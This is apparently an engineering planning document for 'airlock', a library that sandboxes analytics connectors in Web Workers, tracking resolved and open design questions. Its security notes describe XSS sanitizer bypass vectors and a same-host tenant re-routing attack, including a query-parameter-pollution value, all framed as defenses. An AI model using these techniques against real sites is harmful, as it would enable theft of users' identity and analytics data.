> Status: Draft (wizard-generated)
>
> Decisions the initial setup explicitly deferred. Each item has a resolution trigger.
> Resolve by writing an ADR and linking it here.

# Refinement Todo: airlock

## Architecture — design open questions (OQ1–OQ8)

> Promoted 2026-08-25 from `architecture.md` § Open questions (finding #1 of the `/jig:analyze` pass). **MVP1 blockers** must be resolved — via `/jig:arch-review` then `/jig:adr-workflow new` — before SPIDR-splitting the risk-retirement spike. Leanings are recorded so reviewers have a position to attack.

### ~~OQ1 — Chamber isolation strength for MVP1 — ⛔ MVP1 blocker~~ — RESOLVED 2026-08-25
~~**Deferred:** Plain Web Worker vs QuickJS-compiled-to-WASM with a capability bridge. *Leaning: plain Worker for MVP1* — the GA4 connector is first-party code with no untrusted vendor JS; hard chamber isolation becomes load-bearing only at MVP2 (running alloy).~~
**Resolution trigger:** Before the risk-retirement spike spec. Record via ADR; let `/jig:arch-review` attack the leaning.
**Resolved by:** [ADR-0001: Chamber isolation strength for MVP1](decisions/adr-0001-chamber-isolation-strength.md).

### ~~OQ2 — Event descriptor shape + cycle semantics — ⛔ MVP1 blocker~~ — RESOLVED 2026-08-25
~~**Deferred:** Exact fields crossing the airlock, ordering guarantees, batching cadence, backpressure. This is the first architecture spec. (Failure-mode edges partly settled: keepalive-cap overflow splits into multiple cycles — architecture.md § Clarifications Q3.)~~
**Resolution trigger:** First architecture spec. Record via ADR before implementation.
**Resolved by:** [ADR-0002: Event descriptor shape and cycle semantics](decisions/adr-0002-event-descriptor-cycle-semantics.md).

### OQ3 — Vendor-neutral schema now vs emergent
**Deferred:** Commit to a Snowplow/Segment-style self-describing schema up front, or let it emerge from the GA4 mapping and generalize after MVP2? *Leaning: minimal/emergent* — avoid designing a schema before connectors validate it. (product-vision § Stack reconciled to this leaning, 2026-08-25.)
**Resolution trigger:** After MVP2 exercises the second connector archetype, or when a second wire-protocol connector needs shared event shapes.

### ~~OQ4 — Projection snapshot privacy boundary — ⛔ MVP1 blocker~~ — RESOLVED 2026-08-25
~~**Deferred:** Exactly what projection state is allowed to cross the airlock to the worker per event. Part of the boundary contract.~~
**Resolution trigger:** Before the risk-retirement spike spec; pin via `/jig:contracts` (capability API surface) and an ADR.
**Resolved by:** [ADR-0003: Projection snapshot read boundary](decisions/adr-0003-projection-snapshot-privacy.md).

### OQ5 — Identity / first-party cookie store home
**Deferred:** A no-go for MVP1, but where it eventually lives (orchestrator, main thread) and how connectors get scoped access.
**Resolution trigger:** When identity resolution leaves the no-go list (post-MVP2).

### ~~OQ6 — Flicker oracle design~~ — RESOLVED 2026-08-27
~~**Deferred:** Screenshot-diff between pre- and post-decoration paint vs a CLS-after-apply proxy. A servo oracle-component question; the proxy-gap here is why the PZN demo item stays jig-supervised. This is also where the before/after CWV scoreboard (the "punchline" use case) becomes a pinned measurement surface (analyze finding #7).~~
**Resolution trigger:** When designing the servo oracle components for the spike (drive-order step 8).
**Resolved by:** [ADR-0005: Servo oracle design: AND-gate, isolation routing, and flicker (OQ6)](decisions/adr-0005-oracle-design.md) (the flicker-oracle routing half). **Scoreboard-surface residual RESOLVED 2026-09-03 by [spec 029 — the before/after CWV scoreboard](specs/029-cwv-scoreboard/spec.md):** the punchline is now a first-class, reproducible, honestly-hedged output — `npm run cwv:scoreboard` emits the naive/deferred/worker triple (`docs/scoreboard.md`, the committed durable card in tolerance-band language) + the Lighthouse load-CWV arm + a grounded `PROFILE=realistic` load; advisory (ADR-0005), not gating. Deferred beyond MVP5: varied per-tracker cost + the real customer-stack load (creds-gated); the RUM subsume (separate spec).

### ~~OQ7 — Inspector scope in MVP1~~ — RESOLVED 2026-09-03 (spec 028)
~~**Deferred:** How much of the "why did this beacon fire / hold at the seal / get gated" panel ships in MVP1 vs later.~~
**Resolution trigger:** When the diagnostics/inspector surface is specced.
**Resolved by:** [spec 028 — enforcement inspector](specs/028-enforcement-inspector/spec.md) (MVP5 fixed core). Scope shipped: a **read-layer** over the existing 009-02 `onDiagnostic` stream — one shared collector on all three seams (028-01), per-beacon decision chains via a collector-unique `beaconId` (028-02), and a drop-in, local, XSS-safe dev **panel** (028-03). Grounded that the inspector is a read-layer (no new instrumentation), so it lands cheaply. Deliberately NOT in scope (deferred beyond MVP5): a hosted/remote trace backend + persisted historical traces (MVP5 no-go); correlating a beacon back to the originating `push()` event type (worker-stripped — beacon-keyed only); the `unpinned-declared-origin`/payload-governance strip-chain correlation.

### ~~OQ8 — Distribution channel~~ — RESOLVED 2026-09-04
~~**Deferred:** git subtree (matching aem-martech/aem-experimentation) vs npm for the EDS audience. (Repo/package slug settled: `airlockjs`.)~~
**Resolution trigger:** Before the first external release cut.
**Resolved by:** [ADR-0015: Distribution channel: git-subtree (EDS convention)](decisions/adr-0015-distribution-git-subtree.md).

### OQ9 — MVP2 chamber isolation model + synchronous-host-access mechanism (coupled)
**Deferred:** The per-connector isolation model for MVP2 (worker-per-chamber vs QuickJS/WASM sandbox) and the synchronous cookie/storage access mechanism it requires are one coupled decision. R-004 grounded sync-access feasibility only in the plain-Worker single-realm model (host globals by reference); both MVP2 models break that precondition — separate-thread caches cannot share a synchronous cookie view without SharedArrayBuffer + Atomics (AD-4-forbidden); a WASM sandbox must marshal each read, losing the unmodified-stock-bundle property. Also unresolved: out-of-band-write staleness (a credentialed fetch `Set-Cookie`, a second tab, or a main-thread write leaving the worker's synchronous view stale). The MVP1 single-connector case (GA4 `client_id`) is served by a simple per-worker sync-cache; the multi-chamber case is not grounded. Promoted from [ADR-0001](decisions/adr-0001-chamber-isolation-strength.md) (its exposed forward-commitment).
**Resolution trigger:** Before the step-5 capability contract freezes. Settle via a **model-agnostic** coherency probe (e.g. a two-worker proxy exercising concurrent and out-of-band cookie writes) that does not presuppose the deferred B-vs-C model; then record via ADR.
**Probe (spec 011-01, in-band axis, 2026-08-28):** the two-worker coherency rig measured the in-band case — under the MVP1 seed+async-write-back shim generalized to two chambers, the sync-caches diverge on a concurrent RMW into a reproducible **split-identity fault** (both chambers mint an ECID; the jar loses one), and **broker-push invalidation self-heals** it. Window-width ≠ correctness (the coherent broker-push control carried the *wider* staleness window). Per the spec this is a **B-specific discriminator** (single-thread models event-loop-serialize the reads), a real input to the deferred model choice, **not** a premise-threatening no-go. The out-of-band axis (011-02), the go/no-go, and the resolving ADR (011-03) remain open.
**Probe (spec 011-02, out-of-band axis, 2026-08-28):** extended the rig with out-of-band writers. Both positive JS sources (a foreign main-thread script, a second same-origin tab) drive the identity cookie stale; a foreign write under the seed+async shim is a **split-identity fault** (the chamber mints a duplicate), and **broker-push invalidation self-heals** it — a **go** on the out-of-band axis, **not** a stop-and-re-shape. Detection: `cookieStore` `change` did **not** fire for `document.cookie` writes in this Chromium (the listener was validated via `cookieStore.set()`), so both sources detect via the **`document.cookie`-polling fallback** — i.e. option B must **poll**, not rely on `change`. Network `Set-Cookie` is confirmed a **negative boundary** (both variants; header unreadable, R-006 F4); the server-side/CNAME `kndctr_*` `Set-Cookie` mode is out of scope. The go/no-go synthesis + resolving ADR are **011-03**.
**Resolved — coherency/sync-access axis ([ADR-0008](decisions/adr-0008-oq9-coherency-sync-access.md), 2026-08-29):** **GO** — the async concurrent-first-mint fault (two chambers both mint → split identity, model-independent) is retired by **broker-side async request coalescing** (the single-threaded broker holds the second concurrent mint; async, no SAB), **conditional** for the wrapped-SDK archetype (Alloy) on chamber-side vendor-`fetch` interception into the orchestrator's *existing* main-thread dispatch (ADR-0004) + XDM mint-recognition; wire-protocol connectors (GA4) already satisfy it. OQ9's "one coupled decision" premise is **amended**: the coherency axis is separable from the B-vs-C model choice. **Carried forward** (narrower, contract-freeze-constrained): the B-vs-C isolation model, Option-C read-semantics, the design of the wrapped-SDK interception+coalescing mechanism (the freeze-held gate), and the 011-01 synchronous-mint reconciliation (owner approval — issue #125). Converged through 7 ADR-0008 frame-critique rounds; the demonstration slice **011-04 was abandoned** (the deterministic rig can't measure a race the broker serializes away).
**Resolved — B-vs-C isolation axis ([ADR-0009](decisions/adr-0009-mvp2-isolation-option-b.md), 2026-08-29):** **Option B** (a dedicated Worker per chamber) for the MVP2 proof scope; Option C / WASM deferred. Ratified against the built chamber ([spec 012-01](specs/012-mvp2-alloy-chamber/slice-01-host-and-boot.md)): stock alloy runs unmodified in a classic Worker, egress-confined; the 012-01 frame-critique's driver is **egress-chokepoint completeness for untrusted code** (B is adequate *because* AC5 makes the mediated `fetch` the sole network surface, not because a Worker is inherently safe). **The wrapped-SDK interception mechanism is built** (012-01 AC4 — vendor-`fetch` intercepted into the orchestrator's main-thread dispatch + minting), retiring the freeze-held gate for the **single-chamber** case. **012-02 built + demonstrated the concurrent-chamber coalescing** (2026-08-29): two concurrent alloy chambers both first-minting are coalesced by the single-threaded broker to **one** ECID in both jars (in-flight-hold + late-suppression via a completed-mint association; sync-register-before-await invariant; no SAB), while coalescing-off reproduces the split-identity fault — deterministic in a real two-Worker chromium rig (`rig:alloy-coalescing`). ADR-0008's mechanism is thus **demonstrated end-to-end** (single + concurrent chambers), turning its analytical GO into a shown one. This **lifts the freeze _hold_** — but **not** the freeze itself: ADR-0008's kill-criterion still requires a creds-gated **live-Alloy** mint-recognition re-probe before the step-5 contract freeze. **Still carried forward:** Option-C read-semantics (deferred, Option-C only); the **creds-gated live-Alloy mint-recognition re-probe** before the freeze. (The 011-01 synchronous-mint reconciliation, issue #125, was applied 2026-08-29.)
**Resolved — live-Alloy mint-recognition re-probe, mint axis ([spec 013-01](specs/013-mvp3-live-alloy-reprobe/slice-01-edge-roundtrip.md), 2026-08-30):** **CONFIRMED against real Alloy.** One live `interact` to `adobedc.demdex.net` (maintainer test datastream; `rig/alloy-live-reprobe.mjs`, HTTP 200) shows the genuine unmodified-alloy request is recognized as an `ecid-first-mint` (request-side, re-confirmed) **and** the **real** Edge response's `identity:result`/ECID handle is extractable by the same `extractEcidFromInteractResponse` path (response-side — the new probe): ADR-0008's **mint-recognizability kill-criterion holds live**. The **contract-freeze mint axis is cleared** — **necessary, not sufficient**: the broader wrapped-SDK contract-freeze still awaits **013-02** (egress fan-out) + **013-03** (config-integrity). Durable **creds-free** regression landed: `test/fixtures/alloy-live-interact.redacted.json` (identifier VALUES redacted, SHAPE preserved) + `test/alloy-live-mint-recognizability.test.js`. AC3 (deterministic concurrent live coalescing) is **unconstructable** against un-gateable real Edge — correctness stands on 012-02's hermetic proof (method gap recorded, not hidden). The **host-seeded-identity fallback is NOT needed**. Real response also carried a live Target `personalization:decisions` (`__view__`) + `locationHint:result` cluster hints — live inputs 013-02/03 build on.
**Tracked debt — wrapped-SDK core integration + hardening (012-01 review, 2026-08-29):** (a) the round-trip egress (request/response, host-owned URL rewrite, cookie write-back) currently lives in the rig harness as a *parallel* mirror of `core/airlock.js` — wire it into `core/airlock.js` proper (**named owner needed**, so the harness isn't the sole home of an egress model core doesn't share — arch-review flag 1); (b) decide whether the wrapped-SDK **round-trip egress surface** is lifted into `contracts/*.d.ts` or stays chamber-internal gated by the seal (arch flag 2 — `handle → EgressRequest[]` models only fire-and-forget); (c) **converge the two connector-hosting paths** (generic `core/connector-host.js` vs GA4-hardcoded `core/chamber.worker.js`) — retrofit GA4 onto the host so they don't calcify (arch flag 3); (d) wrapped-SDK **production-hardening** (012-01 craft nits): confine the dead-man real-fetch guard, tighten the blanket `eslint-disable`, add a fetch-shim timeout so a never-answered main response can't hang `sendEvent`; (e) **the coalescing broker's in-flight hold reject path** — the rig broker now **settles held awaiters on first-mint dispatch failure** (012-02 craft fix: `catch` rejects held chambers with the error, `completed` left unpopulated → self-heal; tested with a bounded timeout so a regression hangs the test, not the suite); the **core port must preserve** this reject/failure path, and still consider a `completed`-association **invalidation-on-reset** path (bounded today by datastream cardinality, no leak).
**Resolved — (a) named owner + (b) contract home, single-chamber case ([spec 014-01](specs/014-mvp3-wrapped-sdk-core-integration/slice-01-roundtrip-egress-core.md), [ADR-0010](decisions/adr-0010-roundtrip-egress-capability.md), 2026-08-30):** (a) the round-trip egress now has a named owner in `core/` — **not** `core/airlock.js` itself (deliberately left untouched this slice, per the ADR/spec Assumptions; convergence is 014-03) but a **new sibling module**, [`core/wrapped-sdk-host.js`](../../core/wrapped-sdk-host.js), which owns the main-thread round-trip dispatch + cookie write-back reconciliation, extracted from the rig harness (`rig/alloy-chamber-harness.html`) and proven against the 012-01 single-chamber scenario running through `core/` (`rig/alloy-core-host.mjs`, `npm run rig:alloy-core` — PASS, all 26 assertions green). (b) the round-trip egress surface is **declared AND gated** (ADR-0010 Option A, not either/or): `caps.egress.dispatch(req) -> Response` is documented in [`contracts/capability.d.ts`](../../contracts/capability.d.ts) (additive; `EgressDispatchRequest`/`EgressDispatchResponse`, pinned in `test/contract-stability.test.js`) and routed through the orchestrator's own `dispatch` implementation — the single chokepoint a future MVP3 seal gates against the manifest's declared `endpoints`/`purposes` (gate-able, not yet gated — the seal is unbuilt). Partial progress on (d): the **fetch-shim timeout** hardening lands in `core/wrapped-sdk-host.js` (bounded-timeout unit test, `test/wrapped-sdk-host.test.js`), and the dead-man real-fetch guard stays confined (unchanged chamber, re-asserted by the rig `workerRealFetchCalls===0`) — but the blanket `eslint-disable` in `connectors/alloy/alloy-chamber.worker.js` is **untouched** (that file is read-only for this slice) and remains open. **(c) and the rest of (d)/(e) remain open** — carried to 014-02 (coalescing broker into `core/`) and 014-03 (GA4 retrofit onto the generic host / hosting-path convergence). **014-01 arch-review follow-ups (logged):** (arch-4, load-bearing for 014-03) the one-seam convergence must host `core/egress.js`'s **synchronous unload fast path** — an async `caps.egress.dispatch(req)→Promise` cannot serve it, and `EgressDispatchRequest` carries no `keepalive` (ADR-0004); (arch-2) `reconcileForBrokerJar` strips `Secure`/`SameSite` for the localhost rig — a **production https** host must **preserve** them (cookie-security downgrade otherwise); (arch-3) `GrantedCapabilities` now mixes chamber-facing (`egress.dispatch`) + host-side (`cookies.reconcile`) capabilities — an honest split may be worth it in 014-03; (arch-5) `CapabilityRequest.egress:boolean` can't distinguish the two egress models (deferred to 014-03 by ADR-0010's open question).
**Resolved — (e) coalescing broker's reject-path carried into core ([spec 014-02](specs/014-mvp3-wrapped-sdk-core-integration/slice-02-coalescing-core.md), 2026-08-30):** the concurrent-chamber mint-coalescing broker (in-flight-mint table + completed-mint association) is ported into `core/` as a new sibling module, [`core/coalescing-broker.js`](../../core/coalescing-broker.js), sitting ABOVE 014-01's per-chamber round-trip dispatch as the single coalescing point shared across chambers (every chamber's `caps.egress.dispatch = (req) => broker.handleInterceptedFetch(req)`, one broker instance per shared-identity scope). **The reject-path (012-02's craft fix) is preserved EXACTLY**: a first-mint dispatch failure rejects every chamber held in-flight with the same error, `completed` stays unpopulated (self-heal) — tested with the same bounded-timeout pattern (`test/coalescing-broker-core.test.js`, ported from `test/alloy-coalescing-broker.test.js`) and demonstrated live in a real two-chamber-through-core chromium rig (`rig/alloy-coalescing-core.mjs`, `npm run rig:alloy-coalescing-core` — PASS, all 30 assertions green): AC1/AC3/AC4 run through two real core-hosted chambers sharing the one broker; the reject-path (AC2) is exercised directly through a dedicated broker instance (the held-awaiter code path a real chamber's intercepted-fetch dispatch hits 1:1), deliberately decoupled from alloy-SDK-internal error handling. **Still carried forward, unresolved:** the `completed`-association **invalidation-on-reset** path — still bounded today by datastream cardinality (no leak), but a chamber-reset flow that should re-mint is not yet modeled. **XDM mint-recognition relocated (arch-review [1] fix):** the broker is now **vendor-neutral** — `recognize`/`extractIdentity` are **injected**, not imported — and the alloy recognizer moved `rig/alloy-xdm-mint.js → connectors/alloy/xdm-mint.js` (10 importers repointed), so `core/` imports **nothing** from `rig/` (guarded by `test/core-boundary.test.js`). **014-03 follow-ups (arch-review):** (arch-2) retire/redirect the duplicate 012-02 rig broker (`rig/alloy-coalescing-broker.js` — its import was repointed so it still builds; two verbatim copies = drift hazard); (arch-3) the MVP3 **seal-binding point** — broker-entry (gates every mint pre-coalesce) vs real-egress (misses coalesced-away mints) — adjacent to 014-01's arch-4. **(c)** (converging the two connector-hosting paths) remains open, carried to 014-03.
**Resolved — (c) the two connector-hosting paths converged ([spec 014-03](specs/014-mvp3-wrapped-sdk-core-integration/slice-03-converge-hosting.md), 2026-08-30):** GA4 is retrofitted onto `core/connector-host.js` — the same mechanism alloy's chamber hosts through. A new [`connectors/ga4/connector.js`](../../connectors/ga4/connector.js) expresses GA4 as a `ConnectorFactory` (`createGa4Connector`: manifest -> init -> handle), authoring GA4's first manifest (`events`/`reads` declared as an explicit **wildcard** `["*"]` — GA4 accepts arbitrary custom event names and `mapToMp` forwards the whole `params` object, exactly the case ADR-0006 names: "a connector forwarding arbitrary developer params declares a wildcard"; `capabilities.cookies` + `purposes` per ADR-0006/0007). `handle` bridges the contract's `AirlockEvent` to `mapToMp`'s legacy `{type,params}` descriptor via `event.params || event.payload` — the SAME bridge alloy's `toXdm` already uses — and re-homes the per-tracker `busy(workFactor)` fan-out; `mapToMp` itself is **byte-identical** (`git diff connectors/ga4/map.js` empty). `core/chamber.worker.js` is **rewritten in place** (same filename — `build.mjs`/the rig probes/`adapters/eds/index.js` all hardcode the `./chamber.worker.js` sibling specifier, so keeping the name avoided a cascade of unrelated renames) to thin worker-side glue hosting `createConnectorHost(createGa4Connector, cfg)`, exactly mirroring `connectors/alloy/alloy-chamber.worker.js`'s shape — no exported pure function remains there (the old `mapBatch` export is retired; its Node-testability need is now served by `connectors/ga4/connector.js` + `core/connector-host.js`, both independently unit-tested — `test/ga4-connector.test.js`, ported `test/chamber-isolation.test.js`). **`core/airlock.js` needed ZERO changes** (a stronger outcome than the anticipated "Worker URL + init payload" edit): the new chamber consumes the exact same `{trackers, workFactor, endpoints, ctx}` init payload and lives at the exact same `./chamber.worker.js` specifier already in place, so `git diff core/airlock.js` is empty. Verified end-to-end against the REAL production build + a real browser Worker (`npm run build`, `npm run rig:e2e` — PASS; `npm run rig:isolation` — PASS), not just unit tests. **arch-2 rig-broker retirement (from 014-02, above) is ALSO resolved here, mechanically**: `test/alloy-coalescing-broker.test.js` + `rig/alloy-coalescing.mjs` + `rig/alloy-coalescing-harness.html` now import `core/coalescing-broker.js` (injecting the alloy recognizer from `connectors/alloy/xdm-mint.js`, exactly like `test/coalescing-broker-core.test.js`); `rig/alloy-coalescing-broker.js` is deleted — exactly one broker implementation remains.
**Tracked debt — 012-03 (DOM-injection capability + decisions, 2026-08-29 review):** (f) **`decisions.fetch` pull peer** is declared-but-not-built, disambiguated only by docstring (unlike `insertAfterInteraction`, which rejects loudly) — make its not-built status loud in the type, and pin it + `DomHandle` in `contract-stability.test.js`. (g) **`reserveSpace` "layout-stable by construction" is conditional** on the host sizing `minHeight >= decision height` — an over-tall fill reflows; add a production **overflow-clip** so the box can't grow (currently documented as the honest boundary). (h) **AC3c eager-phase wiring** — production must invoke `reserveSpace` in the EDS **eager pre-paint** phase (distinct from airlock's lazy boot); the rig proves the mechanism, not the production wiring. (i) **proposition-shape parsing is split** across `connectors/alloy/decisions.js` + `adapters/eds/decisions-exposure.js` (both re-narrow `Decision.content`) — extract a shared accessor. (j) **the DOM-injection capability touches the "orchestrator is the only DOM-writer" invariant** (`architecture.md`) more directly than cookie sourcing — weight when the adapter→`core/` migration (OQ13) is prioritized. (k) **SECURITY — the `reserveSpace` `fill` uses `innerHTML`** (by-design for authored Target offers, as alloy's own `renderDecisions:true` does): `innerHTML` won't run inserted `<script>` but `on*` handlers survive, so the trust boundary is "Target content trusted + Trusted-Types policy". Production must slot a **sanitizer** via the injectable `setContent` hook + rely on the EDS **TT** policy — do not host untrusted decision HTML without it.
**Resolved — (k) the active-markup sanitizer boundary ([spec 018-01](specs/018-reservespace-security/slice-01-sanitizer-boundary.md), 2026-08-30):** `reserveSpace().fill()`'s default `setContent` is now SANITIZE-then-write, not raw `innerHTML`. **Load-bearing correction made:** the EDS default Trusted-Types policy is COMPATIBILITY-only for the `Element innerHTML` sink (`probes/eds-testbed/scripts/scripts.js:61-78` — it does not strip `on*` or `<script>` there), so "rely on the EDS TT policy" was never a sanitization property — the sanitizer is airlock's OWN: a new vendor-neutral, import-free [`core/sanitize-html.js`](../../core/sanitize-html.js) (`sanitizeHtml(html, { parse })`, parser injected not imported) parses on an inert `DOMParser` and strips every `on*` attribute, `javascript:`/`vbscript:`/`data:text/html` values on the active URL attributes (`href`/`src`/`xlink:href`/`formaction`/`action`/`background`/`poster`), and the `script`/`iframe`/`object`/`embed`/`base`/`meta`/`link` elements — including recursing into a `<template>`'s separate `.content` fragment (a well-known sanitizer-bypass vector found and closed while building the rig, not in the original denylist text). The default write assigns the sanitized value through a memoized Trusted-Types policy (`adapters/eds/dom.js`) when available, else a plain-string fallback — the whole write stays in a try/catch (never breaks the page). The seam stays injectable (`opts.setContent` fully overrides, unchanged) — the default is conservative defense-in-depth, not a complete XSS guarantee (mutation-XSS / parser-differential bypasses, e.g. a `<noscript>` scripting-context mismatch, are named as an explicit, non-gated known boundary, not silently closed). **Proven in a real-chromium Playwright rig** (`rig/sanitize-boundary.mjs`, `npm run rig:sanitize`, wired as a GATING step in `.github/workflows/ci.yml`'s `browser-oracle` job) under the exact EDS boilerplate CSP — Node/vitest has no `DOMParser` and this project ships no jsdom, so the real parse→strip→serialize proof cannot run hermetically (`test/sanitize-html.test.js` covers only the pure predicates + DI wiring). mvp3.md's release-check security criterion is now met.
**Resolved — (f), (g), (i) the reserveSpace/decisions hardening nits ([spec 018-02](specs/018-reservespace-security/slice-02-hardening.md), 2026-08-30):** (f) the granted `decisions.fetch` pull peer — built only in `connectors/alloy/alloy-chamber.worker.js` (the sole site that constructs it) — now REJECTS with a "declared-not-built" message instead of silently resolving `[]` (ambiguous between "no decisions this cycle" and "not built"), mirroring `insertAfterInteraction` (`adapters/eds/dom.js`); `deliver` (the push channel alloy actually uses) is untouched, and a grep confirmed no caller relied on the old `[]` (only `granted.decisions.deliver` is consumed, `connectors/alloy/connector.js`). `contract-stability.test.js` gains a `DomHandle` shape pin (previously unguarded, incl. the optional `fill`) plus a source-text behavioral assertion that the granted `decisions.fetch` throws. (g) `reserveSpace` (`adapters/eds/dom.js`) now caps the reserved box at `minHeight` by default (`max-height` + `overflow: clip`, additive alongside the existing `min-height` reserve) — `min-height` alone is a FLOOR not a ceiling, so a taller fill used to grow the box and reflow surrounding content regardless of `overflow`; capping both makes "layout-stable by construction" true unconditionally, no longer contingent on host sizing discipline (the honest-boundary comment is updated accordingly). A new `ReserveSpaceSpec.grow?: boolean` (additive, pinned in `contract-stability.test.js`) opts a specific reserve OUT of the clip for a host that legitimately wants a growable box. (i) the two `Decision.content`-unwrap re-narrowings are **not** fully unified — a genuine rule-of-three EXCEPTION, not an oversight: `connectors/alloy/decisions.js` now exports a shared `contentOf(x)` base accessor (byte-identical to `htmlOfDecision`'s former inline ternary), and `adapters/eds/decisions-exposure.js`'s `propositionOf` imports + calls it but keeps its OWN extra scope/id-identity gate on top — kept for STRICT byte-identity with the pre-018-02 behavior (018-02 review correction: the two predicates AGREE on every contract shape — a Decision whose `content` lacks scope/id yields `null` both ways; they diverge ONLY on a non-contract chimera `{scope, id, content:{…no scope/id}}` that nothing in the airlock produces, so the difference is prose-only + untested), rather than fully unifying — forcing unification would change that latent non-contract case. Both existing suites (`alloy-decisions`/`decisions-exposure`) stay green UNCHANGED — only new pins/assertions were added. **Still open, unaffected by this slice:** (h) production must still invoke `reserveSpace` in the EDS eager pre-paint phase (distinct from airlock's lazy boot) — the rig proves the mechanism, not the production wiring; 018-02 hardens the existing mechanism, it does not add the wiring. (j) whether/when the DOM-injection capability migrates from `adapters/eds/` to `core/` (the "orchestrator is the only DOM-writer" invariant) remains an open weighting against the OQ13 adapter→core migration, not resolved here.
**MVP3 input — 012-04 (manifest declaration-shape + alloy characterization, 2026-08-29):** the alloy connector now carries a **declared, NOT enforced** `ConnectorManifest` — `endpoints` advisory (ADR-0006) + a `purposes` annotation (ADR-0007, added additively to [`contracts/connector.d.ts`](../../contracts/connector.d.ts)) — and the two-axis behaviour characterization is delivered ([spec 012-04 §Findings](specs/012-mvp2-alloy-chamber/slice-04-manifest-characterize.md)). **The inputs MVP3's secured-seam design consumes:** (a) the manifest `endpoints` is a **FLOOR** — the server-directed demdex/ID-sync egress breadth (Findings Axis 1, live-only) is **creds-gated** to MVP3's live-Alloy Risk-First probe before an endpoint ceiling can bite for the CDP (ADR-0006 kill-criterion); (b) default-context device/web collection (Axis 2) is **NOT chamber-observable by design** (the shimmed-away ambient globals) — MVP3 must ground it by R-004/Adobe docs or a real-DOM main-thread run, **not** a live-in-chamber run; (c) the declared `purposes` vector is what MVP3's ADR-0007 grant resolver reads — nothing gates on it yet (the seal is unbuilt), and a **boundary sentinel** ([`test/alloy-manifest-declaration.test.js`](../../test/alloy-manifest-declaration.test.js)) guards the declared-not-enforced boundary (it asserts an *absence* of gating and goes red the moment MVP3 enforcement is added).
**Measured — egress-breadth Axis-1 live ([spec 013-02](specs/013-mvp3-live-alloy-reprobe/slice-02-egress-fanout.md), 2026-08-30):** the **real-DOM main-thread reference run** (stock alloy, `renderDecisions:true`, real datastream; `rig/alloy-live-fanout.mjs`) fired **2 Adobe-first-party origins** — `adobedc.demdex.net` + `edge.adobedc.net`, both `fetch`/POST → **confined** (the real egress is **2** origins, not the stub's single host), roster-stable across two runs. **ZERO third-party (demdex ID-sync / AAM) fan-out** fired → recorded as a **LOWER BOUND**: this test org has no AAM third-party destinations, so the null result is a **test-org-config artifact, NOT evidence of narrow egress** — the endpoint-ceiling enforcement is **barred** from reading this count as ceiling cardinality. The `<img>`-pixel **shim-swallowed** risk (the no-DOM chamber silently drops DOM-pixel syncs) is **method-validated but unmeasured** here (no 3rd-party syncs to swallow). Verdict: **ADR-0006's "FLOOR not map" holds** for the CDP archetype; a **representative-AAM-destinations re-run** (production-org follow-up) is needed to measure the true 3rd-party breadth + an actual shim-swallow.
**Requirement — config-integrity / same-host tenant re-routing ([spec 013-03](specs/013-mvp3-live-alloy-reprobe/slice-03-config-integrity.md), 2026-08-30):** a compromised alloy chamber can re-point its **datastream** (alloy's `configId`) to an **attacker Adobe tenant on the SAME allowed host** (`adobedc.demdex.net`), sending the user's identity/analytics to the attacker while every host/endpoint allow-list check passes — the tenant rides *outside* the host/path the seal keys on (verified tenant-blind vs ADR-0004/0006). Config is **chamber-mutable** (the chamber owns the alloy instance — re-`configure` or a crafted bypass fetch), so host-owned-config-at-boot is **necessary-but-not-sufficient**. **Demonstrated mitigation (creds-free):** a **seam-side config-integrity check** at the main-thread dispatch ([`rig/config-integrity.js`](../../rig/config-integrity.js), `test/alloy-config-integrity.test.js`) that pins the outbound datastream to the host-set value and **holds at the seal on mismatch** — catches the re-route even from a chamber that owns alloy. **ADR-0006 gap:** its endpoint ceiling does not cover same-host tenant re-routing — file a **config-integrity addition**. **Design lessons (013-03 craft review — must reach the ADR-0006 addition):** (1) **re-derive / OVERRIDE**, not parse-and-compare — a check that trusts the hostile chamber's own URL is evadable (parameter pollution `?configId=<honest>&configId=<attacker>` slips past `.get()`); the seam must re-derive the dispatch URL with only the host pin (`pinnedDispatchUrl`); (2) **fail CLOSED** — absent / duplicated / mismatched configId all HOLD (`getAll`); (3) **bind at BOTH egress seams** (worker `mapBatch` + unload fast path, OQ16); (4) the **orgId/body co-vector** is a residual (datastream-pinning controls routing; close orgId via read-minimization / body inspection if routing-relevant). **AC1 CONFIRMED live (2026-08-30):** real Edge accepts a re-pointed *valid* datastream on the byte-identical host (honest + attacker → HTTP 200, garbage configId → HTTP 400 ⇒ Edge routes by tenant; the host allow-list is blind); the seam-side check holds it (`rig/alloy-live-reroute.mjs`). The threat is now demonstrated end-to-end, not just by inspection. **Remaining follow-up:** ~~wire the seam check into `core/` (MVP3 enforcement)~~ **— being resolved by [spec 015-01](specs/015-mvp3-config-integrity-enforcement/slice-01-fail-closed-enforcement.md) + [ADR-0011](decisions/adr-0011-config-integrity-enforcement.md)** (generic host+tenant control in `core/`, fail-closed hold, 009-02 alert). **Open residual — `orgId`/body routing-relevance (ADR-0011 frame-critique):** the `core/` control's check surface is the **URL** (host + `configId`); alloy's `orgId` rides in the **body**, so an honest-`configId`-URL + attacker-`orgId`-body request passes **unheld and unalerted**. 013-03 left open whether `orgId` is an *independent* routing/identity vector. **Probe it** — a live re-probe pinning `configId` while varying `orgId` (does Edge route/namespace identity by body `orgId` independently of the datastream?); **if yes**, the ADR-0011 URL-param kill criterion fires for alloy → extend to a **body/header-aware** check (or pin `orgId`) **with its own alert**. Until probed, treat the body-`orgId` re-route as a **known-uncovered, silent** residual, not neutralized. **Second open residual — protocol-blindness (015-02 review):** the `core/` control keys on `.host` (not scheme) and `pinnedDispatchUrl` preserves the chamber's scheme, so an `http://` downgrade to the honest host+tenant PASSES the check (allowed), and an override re-derives over `http://` — forwarding the honest tenant/identity over cleartext. This is **outside config-integrity's host+tenant surface by design** (ADR-0011 §2); transport pinning (require `https`) belongs to the **egress allow-list (ADR-0004)** — resolve there (pin scheme on the host allow-list), not by widening config-integrity. (Also still open: optionally confirm downstream data-landing in the second tenant — needs read access.)
